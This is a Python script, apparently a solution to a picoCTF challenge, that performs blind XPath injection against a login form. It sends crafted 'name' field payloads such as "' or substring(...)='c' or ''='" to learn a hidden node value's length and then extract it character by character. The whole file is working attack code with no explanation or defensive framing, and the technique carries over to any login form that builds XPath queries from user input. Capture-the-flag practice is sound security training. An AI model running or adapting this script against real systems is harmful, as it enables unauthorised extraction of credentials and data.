import requests
import string
import sys

URL = 'http://mercury.picoctf.net:16521/'

if len(sys.argv) != 3:
    print(f"Usage: python3 {sys.argv[0]} USER_POSITION NODE_POSITION")
    sys.exit()

user_position, node_position = sys.argv[1:]

s = requests.Session() 
r = requests.get(URL)

characters = string.ascii_letters + string.digits + '{}_()'

length = 0

print("Attempting injection...")

print("Obtaining length...")

for i in range(100):

    data = {'name': f"' or string-length(//user[position()={user_position}]/child::node()[position()={node_position}])={i} or ''='", 'pass': 'test'}

    try:
        r = requests.post(URL, data=data, timeout=2)

    except:
        continue

    if 'on the right path' in r.text:
        length = i
        print("[+] Determined length of node value:", length)
        break

    else:
        print(f"Tried {i}, failed.")

print("Obtaining value...")

for i in range(1, length + 1):

    for char in characters:
        
        data = {'name': f"' or substring((//user[position()={user_position}]/child::node()[position()={node_position}]),{i},1)='{char}' or ''='", 'pass': 'test'}

        try:
            r = requests.post(URL, data=data, timeout=2)

        except:
            continue

        if 'on the right path' in r.text:
            print(f"[+] Found character at position {i}:", char)
            break